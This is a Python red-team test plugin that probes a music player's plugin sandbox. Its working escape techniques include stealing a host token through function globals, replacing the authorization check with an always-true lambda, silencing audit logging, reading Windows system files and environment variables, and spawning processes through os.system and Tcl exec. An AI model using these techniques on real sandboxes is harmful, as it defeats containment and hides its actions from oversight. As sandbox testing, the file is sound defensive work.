# -*- coding: utf-8 -*-
"""plugin/escape —— 越权样本(PoC / 红队夹具)

它不是给人用的插件。默认 can_exec=true 只是为了让 dsh/escape_selftest.py
能自动装载它;真实播放器里只有名字进了 config.json 的 allow_plugin 才会加载
—— 别把它加进去。

点菜单"完整报告"跑一遍,每步给一个判定:
    OK    越权成功(沙盒没挡住)
    BLOCK 被沙盒拦下(预期行为)
    N/A   当前环境验证不了(需要真实 Tk / 缺模块)

这个 PoC 刻意只做**只读**动作(读文件、列目录、读环境变量、stat 探测)和一次
无副作用的 echo:不写文件、不删文件、不联网、不改宿主状态。唯一带副作用的是
把沙盒自己的判权入口换掉 —— 那正是要证明的东西。

已知结论(2026-10 加固之后,实测):
    * 内省拿回 SandBox / 偷 _HOST_TOKEN            -> OK(拿得到,但没用)
    * 拿偷来的凭据调 set_unsafe / grant            -> BLOCK(插件帧 + 已封存)
    * 直接改 box.policy.fs_read                    -> BLOCK(Policy.freeze)
    * 往 box._session 里塞授权                     -> BLOCK(判权按记账里的快照+基线)
    * 替换 box._policy_frozen 成"不受限"快照       -> BLOCK(判权不再读实例属性)
    * 替换 box.can 成恒 True                       -> BLOCK(判权入口也搬进记账了)
    * 替换 box.violation 让拦截不留痕              -> BLOCK(审计入口一并锁了)

第二批加固(见 plugin_sandbox.py 的"判权层")把判权数据从 SandBox 实例上搬到了
模块私有的记账表 `_AUTH` 里:封存后判权只认那份快照 + 一份独立的 session 副本,
门面、`SandBox.can()` 和审计钩子全走同一个 `_auth_can()`,审计钩子在装钩子时
就把判权函数收进了闭包 —— 所以换 `box.can`、换 `_policy_frozen` 都不再有用,
而且 `seal()` 之后这么赋值会被直接拒掉(会留一条审计)。

仍然只能算"已知缺口"、不打算堵的(方案固有上限,见 SANDBOX.md):
    * `os.stat`/`os.lstat` 不产生 Python 审计事件 -> stat 探测挡不住;
    * 内省拿到真 `os` 之后读 `os.environ` 不产生审计事件;
    * `pro.app._app` 这类"门面自己 __slots__ 里存着真宿主"的穿透;
    * Tcl 通道(C 层调用,不产生审计事件),真实播放器里可行。
这几条只做**只读探测**,且都写进了 SANDBOX.md,不是本样本要修的东西。
"""

import json
import os

OUTSIDE = r'C:\Windows\win.ini'
OUTSIDE_DIR = r'C:\Windows'

RESULT = []


# ---------------------------------------------------------------- 工具

def _rec(step, verdict, detail=''):
    RESULT.append((step, verdict, detail))
    tail = f'  -- {detail}' if detail else ''
    print(f'[escape] {verdict:<5} {step}{tail}')


def _box():
    """从 __sandbox__ 拿回 SandBox 对象。

    SandboxView.__slots__ 里放的是绑定方法 sb.can,所以 .__self__ 就是沙盒本身。
    (SANDBOX.md 已把这条列为已知内省路径。)
    """
    return __sandbox__.can.__self__


def _module_globals():
    """plugin_sandbox 模块的全局字典。

    SandboxView.__init__ 是本模块里的普通函数,__globals__ 直接就是模块字典,
    _HOST_TOKEN 就躺在里面。
    """
    return type(__sandbox__).__init__.__globals__


def _real(name):
    """门面背后的真模块。

    _Proxy 用 __slots__ = ('_sb','_real',...) 存真模块,而 __getattr__ 只在
    常规查找失败时才被调用 —— 所以 `._real` 从来不会被 deny 列表拦到。
    """
    return _box().namespace[name]._real


def _real_sys_modules():
    return _real('sys').modules


def _short(exc):
    return f'{type(exc).__name__}: {exc}'[:64]


# ---------------------------------------------------------------- 第一段:撞墙

def step_introspect():
    try:
        box = _box()
    except Exception as e:
        _rec('01 内省拿回 SandBox(.__sandbox__.can.__self__)', 'BLOCK', _short(e))
        return None
    _rec('01 内省拿回 SandBox(.__sandbox__.can.__self__)', 'OK', repr(box))
    return box


def step_steal_token():
    try:
        token = _module_globals().get('_HOST_TOKEN')
    except Exception as e:
        _rec('02 偷 _HOST_TOKEN(函数 __globals__)', 'BLOCK', _short(e))
        return None
    if token is None:
        _rec('02 偷 _HOST_TOKEN(函数 __globals__)', 'BLOCK', '模块字典里没有这个名字')
        return None
    _rec('02 偷 _HOST_TOKEN(函数 __globals__)', 'OK', f'id={id(token):#x}(拿到也未必能用)')
    return token


def step_use_token_unsafe(token):
    label = '03 拿偷来的凭据调 box.set_unsafe(True)'
    try:
        _box().set_unsafe(True, _host_token=token)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', 'unsafe 被打开 —— 沙盒当场失守')


def step_use_token_grant(token):
    label = '04 拿偷来的凭据调 box.grant(fs:write, C:\\)'
    try:
        _box().grant('fs:write', 'C:\\', _host_token=token)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '拿到整个 C 盘的写权限')


def step_patch_policy():
    label = '05 直接改 box.policy.fs_read / net / proc'
    box = _box()
    try:
        box.policy.fs_read = [r'C:\\']
        box.policy.net = True
        box.policy.proc = True
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '策略被改写')


def step_patch_session():
    label = '06 往 box._session 里塞授权'
    box = _box()
    try:
        box._session['fs:write'].add(r'C:\\')
        box._session['net'] = True
        box._session['proc'] = True
    except Exception as e:
        _rec(label, 'BLOCK', f'写入被拦下:{_short(e)}')
        return
    # 写得进去不等于生效:判权读的是记账里的快照 + 授权基线,这条只会留一条
    # tamper 审计。判定必须**只看判权结果** —— 早先这里写成
    # `_rec(..., 'OK' if effective else 'BLOCK')` 却把 effective 算反了,
    # 明明没生效也报"越权成功",报告汇总因此多一条假 OK。
    try:
        effective = box.can('fs:write', r'C:\\')
    except Exception as e:
        _rec(label, 'BLOCK', f'判权查询出错:{_short(e)}')
        return
    if effective:
        _rec(label, 'OK', '写入没被拦,而且判权认了(沙盒当场失守)')
    else:
        _rec(label, 'BLOCK',
             '写入没被拦,但判权忽略它(按快照/基线),只留 tamper 审计')


# ---------------------------------------------------------------- 第二段:拆锁

def step_swap_snapshot():
    """把判权用的只读快照整份换掉。

    Policy.freeze() 只拦住"改 live policy 的属性",_policy_frozen 却是 SandBox
    上的普通属性,直接赋一份 unsafe=True 的快照即可。
    """
    label = '07 替换 box._policy_frozen 为 unsafe 快照'
    box = _box()
    try:
        snap = box.policy.snapshot()
        object.__setattr__(snap, 'unsafe', True)     # 绕过 Policy.__setattr__ 的冻结
        object.__setattr__(snap, 'fs_read', (r'C:\\',))
        object.__setattr__(snap, 'fs_write', (r'C:\\',))
        box._policy_frozen = snap
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '判权快照被换掉,can() 从此恒真')


def step_spoof_can():
    """判权函数本身也是普通实例属性。

    门面的 check_fs/check_net/check_proc 与审计钩子都走 box.can(...),
    换掉它 = 两道闸一起失明。这条不需要凭据、不需要非插件帧、不需要解封存。
    """
    label = '08 替换 box.can 为 lambda: True'
    box = _box()
    try:
        box.can = lambda cap, target=None: True
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '判权入口被换掉(门面 + 审计钩子同时失明)')


def step_silence_audit():
    """把 violation/note 静音,让越权不留痕迹。"""
    label = '09 替换 box.violation 让拦截不再记日志'
    box = _box()
    try:
        box.violation = lambda *a, **k: None
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '后续越权不会再写 logging.warning / 审计事件')


# ---------------------------------------------------------------- 第三段:走出去

def step_read_outside_facade():
    label = f'10 用门面 open() 读 {OUTSIDE}'
    try:
        with open(OUTSIDE, encoding='utf-8', errors='replace') as fp:
            data = fp.read(48)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', repr(data.strip()[:36]))


def step_read_outside_real_os():
    label = '11 用真 open() 读同一个文件(绕过门面)'
    try:
        real_open = _real_sys_modules()['builtins'].open
        with real_open(OUTSIDE, encoding='utf-8', errors='replace') as fp:
            data = fp.read(48)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', repr(data.strip()[:36]))


def step_list_dir_outside():
    label = f'12 用真 os.listdir 列 {OUTSIDE_DIR}'
    try:
        names = _real('os').listdir(OUTSIDE_DIR)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', f'{len(names)} 个条目')


def step_env_vars():
    """os.environ 不产生审计事件,门面靠 deny 列表挡;真 os 直接绕开。"""
    label = '13 读环境变量(真 os.environ)'
    try:
        env = _real('os').environ
        picked = [k for k in env if k.upper() in ('USERPROFILE', 'USERNAME', 'PATH', 'TEMP')]
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', f'{len(env)} 个变量,例如 {sorted(picked)[:3]}')


def step_stat_probe():
    """os.stat / os.lstat 不在 CPython 的审计表里 —— 探测挡不住(已知缺口)。"""
    label = '14 os.stat 探测插件目录外的文件(无审计事件)'
    try:
        st = _real('os').stat(OUTSIDE)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', f'存在,{st.st_size} 字节')


def step_spawn():
    # 不用 subprocess.run(capture_output=True):它要开管道,在受限环境下会
    # WinError 5。os.system 不走管道,而且它自带 os.system 审计事件,
    # 正好把"审计钩子这一层"也验了。
    label = '15 起外部进程(真 os.system)'
    try:
        rc = _real('os').system('echo ESCAPED')
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK' if rc == 0 else 'N/A', f'返回码 {rc}')


def step_host_facade():
    """pro 是白名单门面,但门面自己把真宿主存在 __slots__ 里。"""
    label = '16 穿透 pro.app 门面拿真 Tkapp'
    try:
        raw = getattr(pro.app, '_app')
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
        return
    if raw is None:
        _rec(label, 'N/A', '门面后面没有宿主对象')
        return
    readable = [a for a in ('plugin_list', 'music_dict', 'player', 'env_dict')
                if hasattr(raw, a)]
    _rec(label, 'OK', f'{type(raw).__name__},可读 {readable}')


def step_tcl_channel():
    """Tcl 通道:C 层调用,不产生 Python 审计事件,三道闸都够不着。

    这是方案固有上限(SANDBOX.md 已写明):插件画界面必须拿到 tkinter,
    而 Tcl 自己就能 exec / socket。真实播放器里可行,自测的假宿主没有 tk。
    """
    label = '17 Tcl 通道起进程(tk.eval("exec ..."))'
    try:
        raw = getattr(pro.app, '_app', None)
        tk = getattr(raw, 'tk', None) if raw is not None else None
        if tk is None:
            _rec(label, 'N/A', '假宿主没有 tk;真实播放器里可行(固有上限)')
            return
        out = tk.eval('exec cmd /c echo TCL-ESCAPED')
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'N/A', _short(e))
    else:
        _rec(label, 'OK', repr(str(out).strip()[:32]))


# ---------------------------------------------------------------- 报告

def report():
    RESULT.clear()
    line = '=' * 64
    print(line)
    print('[escape] 越权样本报告(plugin/escape)—— 只读探测,不写不改不联网')
    print(line)
    box = _box()
    print('目标文件   =', OUTSIDE)
    print('已封存     =', box.is_sealed())
    print('策略       =', __sandbox__.describe())
    print('-' * 64)

    print('第一段:撞墙(加固点应当拦住)')
    step_introspect()
    token = step_steal_token()
    step_use_token_unsafe(token)
    step_use_token_grant(token)
    step_patch_policy()
    step_patch_session()

    print('-' * 64)
    print('第二段:拆锁(替换判权数据 / 判权入口本身)')
    step_swap_snapshot()
    step_spoof_can()
    step_silence_audit()

    print('-' * 64)
    print('第三段:走出去(经门面 / 经真模块 / 经宿主对象)')
    step_read_outside_facade()
    step_read_outside_real_os()
    step_list_dir_outside()
    step_env_vars()
    step_stat_probe()
    step_spawn()
    step_host_facade()
    step_tcl_channel()

    print('-' * 64)
    ok = [s for s, v, _ in RESULT if v == 'OK']
    blocked = [s for s, v, _ in RESULT if v == 'BLOCK']
    na = [s for s, v, _ in RESULT if v == 'N/A']
    print(f'汇总:OK={len(ok)}  BLOCK={len(blocked)}  N/A={len(na)}')
    for s in ok:
        print('  越权成功:', s)
    if not ok:
        print('  越权成功的项:无')
    print(line)
    return {'ok': ok, 'blocked': blocked, 'na': na}


def report_quick():
    """只看第一段:加固点有没有拦住。"""
    RESULT.clear()
    box = _box()
    print(f'[escape] 快速自查:sealed={box.is_sealed()} 策略={__sandbox__.describe()}')
    step_introspect()
    step_steal_token()
    return report()



if not __start_sandbox__:
    print('未启用沙盒')
else:# 装载时就把菜单挂上(dsh/escape_selftest.py 靠 label 里的"完整报告"找回调)
    print(f'[escape] 越权样本已装载(env_id={__env_id__}),策略:{__sandbox__.describe()}')
    pro.menu.add_command(label='escape:完整报告(撞墙/逃逸/走出去)', command=report)
    pro.menu.add_command(label='escape:快速自查', command=report_quick)